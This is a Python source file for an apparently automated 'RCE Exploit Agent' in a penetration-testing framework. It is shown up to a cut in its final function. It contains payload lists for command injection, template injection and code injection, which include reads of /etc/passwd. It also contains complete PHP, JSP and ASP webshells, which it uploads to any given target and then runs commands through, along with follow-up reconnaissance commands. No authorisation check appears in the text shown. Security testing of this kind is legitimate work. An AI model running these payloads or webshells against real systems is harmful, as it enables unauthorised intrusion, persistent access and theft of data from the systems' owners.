"""
Remote Code Execution (RCE) Exploit Agent
Professional RCE testing and exploitation agent
"""

import asyncio
import aiohttp
import re
import urllib.parse
import base64
import json
from typing import Dict, List, Any, Optional
from loguru import logger

from agents.base import BaseAgent, AgentResult
from agents.prompt_engineering.cybersecurity_llm import CyberSecurityLLM


class RCEAgent(BaseAgent):
    """
    Professional Remote Code Execution (RCE) Testing Agent
    Performs comprehensive RCE detection and exploitation
    """
    
    def __init__(self):
        super().__init__(
            name="rce_agent",
            agent_type="exploit"
        )
        self.description = "Professional RCE testing and exploitation"
        self.llm = CyberSecurityLLM()
        
        # RCE Detection Payloads - Professional Testing Suite
        self.command_injection_payloads = [
            # Basic command injection
            "; ls",
            "; id",
            "; whoami",
            "; cat /etc/passwd",
            "; pwd",
            "&& id",
            "&& whoami",
            "| id",
            "| whoami",
            "`id`",
            "`whoami`",
            "$(id)",
            "$(whoami)",
            
            # Windows command injection
            "; dir",
            "&& dir",
            "| dir",
            "; type C:\\windows\\system32\\drivers\\etc\\hosts",
            "&& net user",
            
            # Time-based detection
            "; sleep 5",
            "&& sleep 5",
            "| sleep 5",
            "; ping -c 5 127.0.0.1",
            "&& ping -n 5 127.0.0.1"
        ]
        
        self.php_rce_payloads = [
            # PHP code execution
            "<?php echo 'RCE_TEST'; ?>",
            "<?php system('id'); ?>",
            "<?php phpinfo(); ?>",
            "<?php echo shell_exec('whoami'); ?>",
            "<?php eval('echo \"RCE_TEST\";'); ?>",
            "<?php passthru('id'); ?>",
            "<?php exec('whoami', $output); print_r($output); ?>",
            
            # PHP file inclusion + code exec
            "<?php file_get_contents('/etc/passwd'); ?>",
            "<?php readfile('/etc/passwd'); ?>",
            "<?php include('/etc/passwd'); ?>",
            
            # Encoded PHP payloads
            "<?=`id`?>",
            "<?=system('id')?>",
            "<?=shell_exec('id')?>"
        ]
        
        self.python_rce_payloads = [
            # Python code execution
            "__import__('os').system('id')",
            "exec('import os; os.system(\"id\")')",
            "eval('__import__(\"os\").system(\"id\")')",
            "__import__('subprocess').call(['id'])",
            
            # Python SSTI (Server-Side Template Injection)
            "{{7*7}}",
            "{{config}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.__class__.__mro__[8].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('id')}}"
        ]
        
        self.java_rce_payloads = [
            # Java deserialization
            "Runtime.getRuntime().exec(\"id\")",
            "java.lang.Runtime.getRuntime().exec(\"id\")",
            
            # Expression Language Injection
            "${7*7}",
            "#{7*7}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}"
        ]
        
        self.nodejs_rce_payloads = [
            # Node.js code execution
            "require('child_process').exec('id')",
            "process.mainModule.require('child_process').exec('id')",
            "global.process.mainModule.constructor._load('child_process').exec('id')",
            
            # Node.js template injection
            "{{7*7}}",
            "#{7*7}",
            "<%= 7*7 %>",
            "<%- 7*7 %>"
        ]
        
        # Detection patterns for successful RCE
        self.rce_success_patterns = {
            "command_output": [
                r"uid=\d+\(.+\) gid=\d+\(.+\)",  # Linux id command
                r"root:x:0:0:",  # /etc/passwd content
                r"[A-Z]:\\",  # Windows path
                r"PING .+ \d+ bytes",  # ping command output
                r"Directory of [A-Z]:\\",  # Windows dir command
                r"total \d+",  # ls -l output
            ],
            "php_execution": [
                r"RCE_TEST",
                r"PHP Version \d+\.\d+\.\d+",
                r"<title>phpinfo\(\)</title>",
                r"System.*Linux",
                r"Server API.*Apache"
            ],
            "python_execution": [
                r"RCE_TEST",
                r"\d+",  # Simple math evaluation
                r"<Config.*>",  # Flask config object
                r"uid=\d+.*gid=\d+"
            ],
            "template_injection": [
                r"49",  # 7*7 = 49
                r"Template.*Error",
                r"TemplateSyntaxError"
            ],
            "time_based": [
                # Time-based detection through response timing
                r".*"  # Any response (timing is checked separately)
            ]
        }
        
        # File upload RCE vectors
        self.file_upload_payloads = {
            "php_webshell": {
                "filename": "shell.php",
                "content": "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>",
                "content_type": "application/x-php"
            },
            "jsp_webshell": {
                "filename": "shell.jsp",
                "content": "<%@ page import=\"java.io.*\" %>\n<%\nString cmd = request.getParameter(\"cmd\");\nif (cmd != null) {\n    Process p = Runtime.getRuntime().exec(cmd);\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while ( disr != null ) {\n        out.println(disr);\n        disr = dis.readLine();\n    }\n}\n%>",
                "content_type": "application/x-jsp"
            },
            "asp_webshell": {
                "filename": "shell.asp",
                "content": "<%\nSet oScript = Server.CreateObject(\"WSCRIPT.SHELL\")\nSet oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")\nSet oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")\n\nszCMD = request.form(\".CMD\")\nIf (szCMD <> \"\") Then\n    szTempFile = \"C:\\\" & oFileSys.GetTempName()\n    Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)\n    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)\nEnd If\n%>",
                "content_type": "application/x-asp"
            }
        }
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> AgentResult:
        """
        Execute comprehensive RCE testing
        
        Args:
            target: Target URL or domain to test
            config: Configuration options
        """
        try:
            config = config or {}
            await self.expert_update_progress("starting", {
                "message": f"ðŸ” Starting RCE assessment for {target}",
                "target": target,
                "progress": 5
            })
            
            results = {
                "agent": "rce_agent",
                "target": target,
                "vulnerabilities": [],
                "rce_types": [],
                "successful_payloads": [],
                "command_outputs": [],
                "file_upload_tests": {},
                "template_injection_tests": {}
            }
            
            # Step 1: Discover potential RCE injection points
            await self.expert_update_progress("discovering", {
                "message": "ðŸŽ¯ Discovering potential RCE injection points...",
                "progress": 15
            })
            injection_points = await self._discover_rce_points(target, config)
            
            # Step 2: Test command injection
            await self.expert_update_progress("cmd_testing", {
                "message": "ðŸ’» Testing for command injection vulnerabilities...",
                "progress": 25
            })
            cmd_results = await self._test_command_injection(injection_points, config)
            if cmd_results:
                results["vulnerabilities"].extend(cmd_results)
                results["rce_types"].append("command_injection")
            
            # Step 3: Test code execution (PHP, Python, etc.)
            await self.expert_update_progress("code_testing", {
                "message": "ðŸ Testing for code execution vulnerabilities...",
                "progress": 40
            })
            code_results = await self._test_code_execution(injection_points, config)
            if code_results:
                results["vulnerabilities"].extend(code_results)
                results["rce_types"].append("code_execution")
            
            # Step 4: Test template injection
            await self.expert_update_progress("template_testing", {
                "message": "ðŸ“ Testing for template injection vulnerabilities...",
                "progress": 55
            })
            template_results = await self._test_template_injection(injection_points, config)
            if template_results:
                results["vulnerabilities"].extend(template_results)
                results["rce_types"].append("template_injection")
                results["template_injection_tests"] = template_results
            
            # Step 5: Test file upload RCE
            await self.expert_update_progress("upload_testing", {
                "message": "ðŸ“¤ Testing for file upload RCE vulnerabilities...",
                "progress": 70
            })
            upload_results = await self._test_file_upload_rce(target, config)
            if upload_results:
                results["vulnerabilities"].extend(upload_results)
                results["rce_types"].append("file_upload_rce")
                results["file_upload_tests"] = upload_results
            
            # Step 6: Advanced exploitation attempts
            await self.expert_update_progress("exploiting", {
                "message": "ðŸ’¥ Attempting advanced RCE exploitation...",
                "progress": 85
            })
            if results["vulnerabilities"]:
                exploit_results = await self._attempt_advanced_exploitation(results["vulnerabilities"][:3], config)
                results["command_outputs"] = exploit_results
            
            # Step 7: AI-powered analysis
            await self.expert_update_progress("analyzing", {
                "message": "ðŸ¤– AI analysis and recommendations...",
                "progress": 95
            })
            ai_analysis = await self._get_ai_analysis(results)
            results["ai_analysis"] = ai_analysis
            
            await self.expert_update_progress("complete", {
                "message": f"âœ… RCE assessment complete - {len(results['vulnerabilities'])} vulnerabilities found",
                "progress": 100,
                "vulnerabilities_found": len(results['vulnerabilities'])
            })
            
            return AgentResult(
                success=True,
                data=results,
                message=f"RCE assessment complete. Found {len(results['vulnerabilities'])} vulnerabilities."
            )
            
        except Exception as e:
            logger.error(f"RCE agent error: {e}")
            return AgentResult(
                success=False,
                error=f"RCE assessment failed: {e}",
                data={"target": target}
            )
    
    async def _discover_rce_points(self, target: str, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Discover potential RCE injection points"""
        injection_points = []
        
        try:
            # Parse target URL
            if not target.startswith(('http://', 'https://')):
                target = f"https://{target}"
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Common RCE-prone endpoints
                test_urls = [
                    f"{target}/",
                    f"{target}/admin",
                    f"{target}/upload",
                    f"{target}/exec",
                    f"{target}/cmd",
                    f"{target}/shell",
                    f"{target}/eval",
                    f"{target}/api/exec",
                    f"{target}/cgi-bin/",
                    f"{target}/search?q=test",
                    f"{target}/ping?host=127.0.0.1",
                    f"{target}/trace?host=127.0.0.1"
                ]
                
                for url in test_urls:
                    try:
                        async with session.get(url) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Find forms that might execute commands
                                forms = await self._extract_rce_prone_forms(content, str(response.url))
                                for form in forms:
                                    injection_points.append({
                                        "url": form["action"],
                                        "type": "form",
                                        "method": form["method"],
                                        "inputs": form["inputs"],
                                        "risk_level": self._assess_form_risk(form)
                                    })
                                
                                # Find URL parameters
                                parsed_url = urllib.parse.urlparse(str(response.url))
                                if parsed_url.query:
                                    params = urllib.parse.parse_qs(parsed_url.query)
                                    for param in params:
                                        injection_points.append({
                                            "url": str(response.url),
                                            "type": "parameter",
                                            "method": "GET",
                                            "parameter": param,
                                            "risk_level": self._assess_param_risk(param)
                                        })
                                
                                # Find potential API endpoints
                                api_patterns = [
                                    r'/api/[^"\s]+',
                                    r'/exec[^"\s]*',
                                    r'/cmd[^"\s]*',
                                    r'/shell[^"\s]*'
                                ]
                                
                                for pattern in api_patterns:
                                    matches = re.findall(pattern, content)
                                    for match in matches:
                                        full_url = urllib.parse.urljoin(str(response.url), match)
                                        injection_points.append({
                                            "url": full_url,
                                            "type": "api_endpoint",
                                            "method": "POST",
                                            "risk_level": "high"
                                        })
                    
                    except Exception as e:
                        logger.debug(f"Error testing URL {url}: {e}")
                        continue
        
        except Exception as e:
            logger.error(f"Error discovering RCE points: {e}")
        
        return injection_points[:20]  # Limit results
    
    async def _extract_rce_prone_forms(self, content: str, base_url: str) -> List[Dict[str, Any]]:
        """Extract forms that might be prone to RCE"""
        forms = []
        
        try:
            # Find all forms
            form_pattern = r'<form[^>]*>(.*?)</form>'
            form_matches = re.finditer(form_pattern, content, re.IGNORECASE | re.DOTALL)
            
            for form_match in form_matches:
                form_html = form_match.group(0)
                
                # Extract action
                action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                action = action_match.group(1) if action_match else base_url
                action = urllib.parse.urljoin(base_url, action)
                
                # Extract method
                method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                method = method_match.group(1).upper() if method_match else "GET"
                
                # Extract inputs
                inputs = []
                input_pattern = r'<input[^>]*>'
                for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                    input_html = input_match.group(0)
                    name_match = re.search(r'name=["\']([^"\']*)["\']', input_html)
                    type_match = re.search(r'type=["\']([^"\']*)["\']', input_html)
                    
                    if name_match:
                        inputs.append({
                            "name": name_match.group(1),
                            "type": type_match.group(1) if type_match else "text"
                        })
                
                # Check for file upload inputs
                if 'type="file"' in form_html.lower():
                    inputs.append({"name": "file_upload", "type": "file"})
                
                if inputs:
                    forms.append({
                        "action": action,
                        "method": method,
                        "inputs": inputs,
                        "html": form_html
                    })
        
        except Exception as e:
            logger.error(f"Error extracting RCE-prone forms: {e}")
        
        return forms
    
    def _assess_form_risk(self, form: Dict[str, Any]) -> str:
        """Assess the RCE risk level of a form"""
        high_risk_indicators = [
            "exec", "cmd", "command", "shell", "eval", "system",
            "upload", "file", "ping", "trace", "nslookup"
        ]
        
        form_text = form.get("html", "").lower()
        action_url = form.get("action", "").lower()
        
        for indicator in high_risk_indicators:
            if indicator in form_text or indicator in action_url:
                return "high"
        
        # Check input names
        for input_field in form.get("inputs", []):
            input_name = input_field.get("name", "").lower()
            if any(indicator in input_name for indicator in high_risk_indicators):
                return "high"
            if input_field.get("type") == "file":
                return "medium"
        
        return "low"
    
    def _assess_param_risk(self, param_name: str) -> str:
        """Assess the RCE risk level of a URL parameter"""
        high_risk_params = [
            "cmd", "command", "exec", "system", "shell", "eval",
            "host", "ip", "url", "file", "path", "ping"
        ]
        
        param_lower = param_name.lower()
        for risk_param in high_risk_params:
            if risk_param in param_lower:
                return "high"
        
        return "medium"
    
    async def _test_command_injection(self, injection_points: List[Dict[str, Any]], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for command injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                for point in injection_points[:10]:  # Limit for performance
                    for payload in self.command_injection_payloads[:8]:  # Test subset of payloads
                        vulnerability = await self._test_single_command_payload(session, point, payload)
                        if vulnerability:
                            vulnerabilities.append(vulnerability)
                            break  # Found vulnerability, move to next point
        
        except Exception as e:
            logger.error(f"Command injection testing error: {e}")
        
        return vulnerabilities
    
    async def _test_single_command_payload(self, session: aiohttp.ClientSession, injection_point: Dict[str, Any], payload: str) -> Optional[Dict[str, Any]]:
        """Test a single command injection payload"""
        try:
            if injection_point["type"] == "parameter":
                # Test URL parameter injection
                parsed_url = urllib.parse.urlparse(injection_point["url"])
                params = urllib.parse.parse_qs(parsed_url.query)
                param_name = injection_point.get("parameter")
                
                if param_name in params:
                    # Test with original value + payload
                    original_value = params[param_name][0] if params[param_name] else ""
                    params[param_name] = [original_value + payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    start_time = asyncio.get_event_loop().time()
                    async with session.get(test_url) as response:
                        end_time = asyncio.get_event_loop().time()
                        response_time = end_time - start_time
                        content = await response.text()
                        
                        # Check for command output patterns
                        if self._check_command_execution(content, payload):
                            return {
                                "url": injection_point["url"],
                                "parameter": param_name,
                                "vulnerability_type": "command_injection",
                                "severity": "critical",
                                "payload_used": payload,
                                "evidence": self._extract_command_evidence(content, payload),
                                "response_time": response_time
                            }
                        
                        # Check for time-based injection (sleep, ping commands)
                        if ("sleep" in payload or "ping" in payload) and response_time > 4.0:
                            return {
                                "url": injection_point["url"],
                                "parameter": param_name,
                                "vulnerability_type": "time_based_command_injection",
                                "severity": "high",
                                "payload_used": payload,
                                "evidence": f"Response delayed by {response_time:.2f} seconds",
                                "response_time": response_time
                            }
            
            elif injection_point["type"] == "form":
                # Test form injection
                form_data = {}
                for input_field in injection_point.get("inputs", []):
                    if input_field["type"] in ["text", "search", "hidden"]:
                        form_data[input_field["name"]] = payload
                    elif input_field["type"] == "email":
                        form_data[input_field["name"]] = f"test@example.com{payload}"
                    else:
                        form_data[input_field["name"]] = "test"
                
                if form_data:
                    method = injection_point.get("method", "POST")
                    start_time = asyncio.get_event_loop().time()
                    
                    if method.upper() == "GET":
                        async with session.get(injection_point["url"], params=form_data) as response:
                            end_time = asyncio.get_event_loop().time()
                            content = await response.text()
                    else:
                        async with session.post(injection_point["url"], data=form_data) as response:
                            end_time = asyncio.get_event_loop().time()
                            content = await response.text()
                    
                    response_time = end_time - start_time
                    
                    if self._check_command_execution(content, payload):
                        return {
                            "url": injection_point["url"],
                            "form_fields": list(form_data.keys()),
                            "vulnerability_type": "command_injection",
                            "severity": "critical",
                            "payload_used": payload,
                            "evidence": self._extract_command_evidence(content, payload),
                            "response_time": response_time
                        }
                    
                    if ("sleep" in payload or "ping" in payload) and response_time > 4.0:
                        return {
                            "url": injection_point["url"],
                            "form_fields": list(form_data.keys()),
                            "vulnerability_type": "time_based_command_injection",
                            "severity": "high",
                            "payload_used": payload,
                            "evidence": f"Response delayed by {response_time:.2f} seconds",
                            "response_time": response_time
                        }
        
        except Exception as e:
            logger.debug(f"Error testing command payload: {e}")
        
        return None
    
    def _check_command_execution(self, content: str, payload: str) -> bool:
        """Check if command execution was successful"""
        for category, patterns in self.rce_success_patterns.items():
            if category == "command_output":
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE | re.MULTILINE):
                        return True
        return False
    
    def _extract_command_evidence(self, content: str, payload: str) -> str:
        """Extract evidence of successful command execution"""
        # Look for common command outputs
        evidence_patterns = [
            r"uid=\d+\(.+\) gid=\d+\(.+\)",
            r"root:x:0:0:[^:]*:[^:]*:[^\n]+",
            r"[A-Z]:\\[^\s]+",
            r"total \d+[^\n]*",
            r"\d+ bytes.*time.*TTL"
        ]
        
        for pattern in evidence_patterns:
            match = re.search(pattern, content, re.MULTILINE)
            if match:
                return f"Command output detected: {match.group(0)}"
        
        return "Command execution indicators found in response"
    
    async def _test_code_execution(self, injection_points: List[Dict[str, Any]], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for code execution vulnerabilities"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Test PHP code execution
                php_vulns = await self._test_language_execution(session, injection_points, self.php_rce_payloads, "php")
                vulnerabilities.extend(php_vulns)
                
                # Test Python code execution
                python_vulns = await self._test_language_execution(session, injection_points, self.python_rce_payloads, "python")
                vulnerabilities.extend(python_vulns)
                
                # Test Java code execution
                java_vulns = await self._test_language_execution(session, injection_points, self.java_rce_payloads, "java")
                vulnerabilities.extend(java_vulns)
                
                # Test Node.js code execution
                nodejs_vulns = await self._test_language_execution(session, injection_points, self.nodejs_rce_payloads, "nodejs")
                vulnerabilities.extend(nodejs_vulns)
        
        except Exception as e:
            logger.error(f"Code execution testing error: {e}")
        
        return vulnerabilities
    
    async def _test_language_execution(self, session: aiohttp.ClientSession, injection_points: List[Dict[str, Any]], payloads: List[str], language: str) -> List[Dict[str, Any]]:
        """Test code execution for a specific language"""
        vulnerabilities = []
        
        for point in injection_points[:5]:  # Limit for performance
            for payload in payloads[:3]:  # Test subset of payloads
                try:
                    vulnerability = await self._test_single_code_payload(session, point, payload, language)
                    if vulnerability:
                        vulnerabilities.append(vulnerability)
                        break  # Found vulnerability, move to next point
                except Exception as e:
                    logger.debug(f"Error testing {language} payload: {e}")
                    continue
        
        return vulnerabilities
    
    async def _test_single_code_payload(self, session: aiohttp.ClientSession, injection_point: Dict[str, Any], payload: str, language: str) -> Optional[Dict[str, Any]]:
        """Test a single code execution payload"""
        try:
            # Similar to command injection testing but looking for different patterns
            if injection_point["type"] == "parameter":
                parsed_url = urllib.parse.urlparse(injection_point["url"])
                params = urllib.parse.parse_qs(parsed_url.query)
                param_name = injection_point.get("parameter")
                
                if param_name in params:
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        if self._check_code_execution(content, payload, language):
                            return {
                                "url": injection_point["url"],
                                "parameter": param_name,
                                "vulnerability_type": f"{language}_code_execution",
                                "severity": "critical",
                                "payload_used": payload,
                                "evidence": self._extract_code_evidence(content, payload, language)
                            }
        
        except Exception as e:
            logger.debug(f"Error testing code payload: {e}")
        
        return None
    
    def _check_code_execution(self, content: str, payload: str, language: str) -> bool:
        """Check if code execution was successful"""
        if language == "php":
            for pattern in self.rce_success_patterns["php_execution"]:
                if re.search(pattern, content, re.IGNORECASE):
                    return True
        elif language == "python":
            for pattern in self.rce_success_patterns["python_execution"]:
                if re.search(pattern, content, re.IGNORECASE):
                    return True
        # Add more language checks as needed
        
        return False
    
    def _extract_code_evidence(self, content: str, payload: str, language: str) -> str:
        """Extract evidence of successful code execution"""
        if language == "php" and "phpinfo" in payload.lower():
            if "PHP Version" in content:
                return "PHP info page executed successfully"
        elif "RCE_TEST" in content:
            return "Code execution marker found in response"
        elif language == "python" and "{{7*7}}" in payload:
            if "49" in content:
                return "Template math evaluation successful (7*7=49)"
        
        return f"Code execution evidence found for {language}"
    
    async def _test_template_injection(self, injection_points: List[Dict[str, Any]], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for template injection vulnerabilities"""
        template_vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Template injection payloads
                template_payloads = [
                    "{{7*7}}",
                    "${7*7}",
                    "#{7*7}",
                    "<%= 7*7 %>",
                    "{{config}}",
                    "${T(java.lang.Runtime).getRuntime().exec('id')}",
                    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
                ]
                
                for point in injection_points[:5]:
                    for payload in template_payloads:
                        try:
                            vulnerability = await self._test_template_payload(session, point, payload)
                            if vulnerability:
                                template_vulnerabilities.append(vulnerability)
                                break
                        except Exception as e:
                            logger.debug(f"Error testing template payload: {e}")
                            continue
        
        except Exception as e:
            logger.error(f"Template injection testing error: {e}")
        
        return template_vulnerabilities
    
    async def _test_template_payload(self, session: aiohttp.ClientSession, injection_point: Dict[str, Any], payload: str) -> Optional[Dict[str, Any]]:
        """Test a single template injection payload"""
        try:
            if injection_point["type"] == "parameter":
                parsed_url = urllib.parse.urlparse(injection_point["url"])
                params = urllib.parse.parse_qs(parsed_url.query)
                param_name = injection_point.get("parameter")
                
                if param_name in params:
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check for template evaluation
                        if "{{7*7}}" in payload and "49" in content:
                            return {
                                "url": injection_point["url"],
                                "parameter": param_name,
                                "vulnerability_type": "template_injection",
                                "severity": "high",
                                "payload_used": payload,
                                "evidence": "Template math evaluation successful (7*7=49)"
                            }
                        elif "${7*7}" in payload and "49" in content:
                            return {
                                "url": injection_point["url"],
                                "parameter": param_name,
                                "vulnerability_type": "expression_language_injection",
                                "severity": "high",
                                "payload_used": payload,
                                "evidence": "Expression language evaluation successful"
                            }
                        elif "config" in payload.lower() and ("<Config" in content or "SECRET_KEY" in content):
                            return {
                                "url": injection_point["url"],
                                "parameter": param_name,
                                "vulnerability_type": "template_injection",
                                "severity": "critical",
                                "payload_used": payload,
                                "evidence": "Configuration object exposed through template injection"
                            }
        
        except Exception as e:
            logger.debug(f"Error testing template payload: {e}")
        
        return None
    
    async def _test_file_upload_rce(self, target: str, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for file upload RCE vulnerabilities"""
        upload_vulnerabilities = []
        
        try:
            # Parse target URL
            if not target.startswith(('http://', 'https://')):
                target = f"https://{target}"
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Common upload endpoints
                upload_urls = [
                    f"{target}/upload",
                    f"{target}/upload.php",
                    f"{target}/fileupload",
                    f"{target}/admin/upload",
                    f"{target}/api/upload"
                ]
                
                for upload_url in upload_urls:
                    try:
                        # First, check if upload endpoint exists
                        async with session.get(upload_url) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Look for file upload forms
                                if 'type="file"' in content.lower():
                                    # Test webshell upload
                                    for shell_type, shell_data in self.file_upload_payloads.items():
                                        vulnerability = await self._test_webshell_upload(session, upload_url, shell_data, shell_type)
                                        if vulnerability:
                                            upload_vulnerabilities.append(vulnerability)
                    
                    except Exception as e:
                        logger.debug(f"Error testing upload URL {upload_url}: {e}")
                        continue
        
        except Exception as e:
            logger.error(f"File upload RCE testing error: {e}")
        
        return upload_vulnerabilities
    
    async def _test_webshell_upload(self, session: aiohttp.ClientSession, upload_url: str, shell_data: Dict[str, Any], shell_type: str) -> Optional[Dict[str, Any]]:
        """Test webshell upload"""
        try:
            # Create multipart form data
            data = aiohttp.FormData()
            data.add_field('file', 
                          shell_data["content"],
                          filename=shell_data["filename"],
                          content_type=shell_data["content_type"])
            
            async with session.post(upload_url, data=data) as response:
                content = await response.text()
                
                # Check if upload was successful
                if response.status in [200, 201] and ("success" in content.lower() or "uploaded" in content.lower()):
                    # Try to access the uploaded shell
                    shell_url = f"{upload_url.rsplit('/', 1)[0]}/{shell_data['filename']}"
                    
                    try:
                        test_cmd = "id" if shell_type == "php_webshell" else "dir"
                        shell_params = {"cmd": test_cmd}
                        
                        async with session.get(shell_url, params=shell_params) as shell_response:
                            shell_content = await shell_response.text()
                            
                            if self._check_webshell_execution(shell_content, test_cmd):
                                return {
                                    "url": upload_url,
                                    "shell_url": shell_url,
                                    "vulnerability_type": "file_upload_rce",
                                    "shell_type": shell_type,
                                    "severity": "critical",
                                    "evidence": f"Webshell uploaded and executed successfully",
                                    "command_output": shell_content[:200]  # Limit output
                                }
                    
                    except Exception as e:
                        logger.debug(f"Error accessing uploaded shell: {e}")
        
        except Exception as e:
            logger.debug(f"Error testing webshell upload: {e}")
        
        return None
    
    def _check_webshell_execution(self, content: str, command: str) -> bool:
        """Check if webshell executed successfully"""
        if command == "id":
            return re.search(r"uid=\d+", content) is not None
        elif command == "dir":
            return "Directory of" in content or "total" in content
        return False
    
    async def _attempt_advanced_exploitation(self, vulnerabilities: List[Dict[str, Any]], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Attempt advanced exploitation of found vulnerabilities"""
        exploitation_results = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                for vuln in vulnerabilities:
                    if vuln["vulnerability_type"] == "command_injection":
                        # Try to extract system information
                        system_info = await self._extract_system_info(session, vuln)
                        if system_info:
                            exploitation_results.append({
                                "vulnerability": vuln,
                                "exploitation_type": "system_reconnaissance",
                                "data_extracted": system_info
                            })
                    
                    elif vuln["vulnerability_type"] == "file_upload_rce":
                        # Try to establish persistence
                        persistence_result = await self._test_persistence(session, vuln)
                        if persistence_result:
                            exploitation_results.append({
                                "vulnerability": vuln,
                                "exploitation_type": "persistence_attempt",
                                "result": persistence_result
                            })
        
        except Exception as e:
            logger.error(f"Advanced exploitation error: {e}")
        
        return exploitation_results
    
    async def _extract_system_info(self, session: aiohttp.ClientSession, vulnerability: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Extract system information through RCE"""
        system_commands = {
            "os_info": "uname -a || ver",
            "user_info": "whoami && id",
            "network_info": "ifconfig || ipconfig",
            "process_info": "ps aux || tasklist"
        }
        
        system_info = {}
        
        for info_type, command in system_commands.items():
            try:
                # Modify the original vulnerable request with new command
                if vulnerability.get("parameter"):
                    # Parameter-based RCE
                    parsed_url = urllib.parse.urlparse(vulnerability["url"])
                    params = urllib.parse.parse_qs(parsed_url.query)
                    param_name = vulnerability["parameter"]
                    params[param_name] = [command]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    async with session.get(test_url) as response:
                        content = await response.text()
                        if self._extract_useful_output(content):
                            system_info[info_type] = content[:500]  # Limit output
            
            except Exception as e:
                logger.debug(f"Error extracting {info_type}: {e}")
                continue
        
        return system_info if system_info else None
    
    def _extract_useful_output(self, content: str) -> bool:
        """Check if content contains useful system information"""
        useful_patterns = [
            r"Linux.*\d+\.\d+",
            r"Windows.*Version",
            r"uid=\d+",
            r"inet \d+\.\d+\.\d+\.\d+",
            r"PID.*PPID"
        ]
        
        for pattern in useful_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    async def _test_persistence(self, session: aiohttp.ClientSession, vulnerability: Dict[str, Any]) -> Optional[str]:
        """Test persistence capabilities"""
        # This would be a very careful, limited test
        # For demonstration purposes only
        return "Persistence testing would be performed here with extreme caution"
    
    async def _get_ai_analysis(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Get AI-powered RCE analysis and recommendations"""
        try:
            prompt = f"""
            You are a professional cybersecurity expert analyzing RCE test results.
            
            Target: {results['target']}
            Vulnerabilities Found: {len(results['vulnerabilities'])}
            RCE Types Found: {results['rce_types']}
            Command Outputs: {len(results['command_outputs'])}
            
            Vulnerability Details:
            {results['vulnerabilities'][:3] if results['vulnerabilities'] else 'None found'}
            
            Provide:
            1. Risk assessment (Critical/High/Medium/Low)
            2. Business impact analysis (data breach, system compromise, etc.)
            3. Specific remediation steps for each RCE type found
            4. Input validation and sanitization recommendations
            5. System hardening recommendations
            6. Monitoring and detection strategies
            7. Incident response procedures
            
            Be professional, detailed, and actionable.
            """
            
            ai_response = await self.llm.query_llm(
                prompt,
                context={
                    "agent_type": "rce_specialist",
                    "analysis_type": "vulnerability_assessment",
                    "results": results
                }
            )
            
            return {
                "risk_level": self._calculate_rce_risk(results),
                "ai_recommendations": ai_response,
                "remediation_priority": "immediate" if results['vulnerabilities'] else "low",
                "compliance_impact": self._assess_compliance_impact(results)
            }
        
        except Exception as e:
            logger.error(f"AI analysis failed: {e}")
            return {
                "risk_level": "high",
                "ai_recommendations": "Manual review required",
                "error": str(e)
            }
    
    def _calculate_rce_risk(self, results: Dict[str, Any]) -> str:
        """Calculate RCE risk level"""
        if not results['vulnerabilities']:
            return "low"
        
        critical_types = ["command_injection", "file_upload_rce", "php_code_execution"]
        high_types = ["template_injection", "expression_language_injection"]
        
        for vuln in results['vulnerabilities']:
            vuln_type = vuln.get('vulnerability_type', '')
            if any(critical in vuln_type for critical in critical_types):
                return "critical"
            elif any(high in vuln_type for high in high_types):
